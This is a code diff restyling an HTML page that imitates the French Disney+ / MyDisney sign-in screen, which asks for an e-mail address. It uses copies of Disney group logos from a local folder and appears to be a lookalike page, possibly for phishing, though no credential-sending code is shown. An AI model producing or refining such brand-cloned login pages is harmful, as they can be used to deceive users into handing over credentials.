@@ -4,12 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion | Disney+</title>
-  <link rel="stylesheet" href="style.css" />
   <style>
     body {
       margin: 0;
-      font-family: 'Helvetica Neue', Arial, sans-serif;
-      background: url('Images/compose.png') no-repeat center center/cover;
+      font-family: Arial, Helvetica, sans-serif;
+      background: radial-gradient(circle at top, #003264 0%, #032541 100%);
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -19,36 +18,34 @@
     .logo {
       margin-top: 40px;
       width: 140px;
-      height: auto;
     }
 
-    .form-wrapper {
+    main {
       background-color: #fff;
       color: #000;
       max-width: 420px;
       width: 100%;
-      margin-top: 30px;
-      border-radius: 18px;
+      border-radius: 20px;
       padding: 40px 30px;
-      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+      margin: 30px 20px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
       text-align: center;
     }
 
-    .form-wrapper img.my-disney {
-      width: 100px;
-      margin-bottom: 15px;
+    .my-disney {
+      width: 90px;
+      margin-bottom: 10px;
     }
 
-    .form-wrapper h1 {
-      font-size: 1.5rem;
-      font-weight: bold;
-      margin-bottom: 12px;
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 10px;
     }
 
-    .form-wrapper p {
+    p {
       font-size: 0.95rem;
       color: #333;
-      margin-bottom: 25px;
+      margin-bottom: 24px;
       line-height: 1.4;
     }
 
@@ -56,32 +53,28 @@
       width: 100%;
       padding: 14px;
       font-size: 1rem;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      margin-bottom: 25px;
+      border-radius: 4px;
+      border: none;
       background-color: #f0f0f0;
-    }
-
-    input[type="email"]::placeholder {
-      color: #888;
+      margin-bottom: 25px;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.1);
     }
 
     button {
       width: 100%;
       padding: 14px;
       background-color: #000;
-      color: white;
+      color: #fff;
       font-weight: bold;
       font-size: 1rem;
       border: none;
-      border-radius: 50px;
+      border-radius: 999px;
       cursor: pointer;
-      transition: background-color 0.3s ease, transform 0.2s ease;
+      transition: background-color 0.3s ease;
     }
 
     button:hover {
       background-color: #333;
-      transform: scale(1.02);
     }
 
     .footer-note {
@@ -89,43 +82,49 @@
       color: #444;
       margin-top: 30px;
       line-height: 1.4;
+      text-align: left;
     }
 
     .logos-container {
       display: flex;
       flex-wrap: wrap;
-      justify-content: center;
-      gap: 16px;
-      margin-top: 15px;
-      margin-bottom: -5px;
+      justify-content: start;
+      align-items: center;
+      gap: 14px;
+      margin-top: 18px;
     }
 
     .logos-container img {
-      height: 24px;
-      opacity: 0.65;
+      height: 22px;
+      opacity: 0.7;
       filter: grayscale(100%);
     }
 
+    a {
+      color: #0063e5;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
     @media (max-width: 480px) {
-      .form-wrapper {
-        margin: 20px;
+      .logo {
+        width: 110px;
+        margin-top: 30px;
+      }
+
+      main {
         padding: 30px 20px;
       }
 
-      .form-wrapper h1 {
-        font-size: 1.3rem;
+      h1 {
+        font-size: 1.4rem;
       }
 
-      .logo {
-        width: 110px;
-      }
-
-      .form-wrapper img.my-disney {
-        width: 80px;
-      }
-
-      .logos-container {
-        gap: 10px;
+      .my-disney {
+        width: 75px;
       }
 
       .logos-container img {
@@ -137,7 +136,7 @@
 <body>
   <img src="Images/compose2.png" alt="Disney+" class="logo" />
 
-  <main class="form-wrapper">
+  <main>
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney" />
     <h1>Entrez votre adresse e-mail pour continuer</h1>
     <p>
@@ -150,17 +149,17 @@
 
     <div class="footer-note">
       <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
-      MyDisney vous permet d'accéder facilement aux différents services des entreprises du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#" style="color: #0063e5;">et bien +</a>.
+      MyDisney vous permet d'accéder facilement aux différents services des entreprises du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
 
-     <div class="logos-container">
-  <img src="Images/compose2.png" alt="Disney+" />
-  <img src="Images/abc-logo-image-4413.png" alt="ABC" />
-  <img src="Images/espn-png-logo-4149.png" alt="ESPN" />
-  <img src="Images/marvel-logo-34291.png" alt="Marvel" />
-  <img src="Images/star-wars-logo-1002.png" alt="Star Wars" />
-  <img src="Images/Hulu-Logo.png" alt="Hulu" />
-  <img src="Images/natgeo-logo.png" alt="National Geographic" />
-  <img src="Images/star-logo.png" alt="Star" />
+      <div class="logos-container">
+        <img src="Images/compose2.png" alt="Disney+" />
+        <img src="Images/abc-logo-image-4413.png" alt="ABC" />
+        <img src="Images/espn-png-logo-4149.png" alt="ESPN" />
+        <img src="Images/marvel-logo-34291.png" alt="Marvel" />
+        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" />
+        <img src="Images/Hulu-Logo.png" alt="Hulu" />
+        <img src="Images/natgeo-logo.png" alt="National Geographic" />
+        <img src="Images/star-logo.png" alt="Star" />
       </div>
     </div>
   </main>
@@ -175,3 +174,4 @@
   </script>
 </body>
 </html>
+}
